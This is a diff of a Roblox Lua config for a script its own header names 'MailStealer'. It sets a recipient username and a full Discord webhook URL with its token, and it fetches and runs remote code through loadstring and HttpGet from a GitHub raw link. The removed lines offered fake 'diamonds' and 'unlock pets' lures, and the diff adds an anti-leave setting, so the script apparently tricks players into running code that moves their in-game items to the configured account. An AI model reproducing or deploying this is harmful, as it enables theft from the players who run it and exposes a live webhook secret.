@@ -1,23 +1,9 @@
---[[ HosteeScriptz MailStealer ]]--
-
---[[ Main Config ]]--
 _G.UserName = "TehPucuk_55"
 _G.UserName2 = "TehPucuk_55"
-
---[[ Fun Features ]]--
-_G.Diamonds = "500000"
-_G.UnlockPets = true
-_G.AntiLeave = true
-
---[[ Webhook Config ]]--
 _G.Webhook = "https://discord.com/api/webhooks/1105338973276098640/06ugJwRCNfo9JEKzGcvhiPQjz4v72-qeUH1Hz3MnRSpAqMcteAyq4Pxk5CmpZC5sXSxu"
 
---[[ Text To Say On Gui ]]--
-_G.Tip1 = "lol"
-_G.Tip2 = "lol"
-_G.Tip3 = "lol"
-_G.Tip4  = "lol"
-_G.Tip5 = "lol"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = false
 
---[[ Script ]]--
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/MonzPremium", true))()
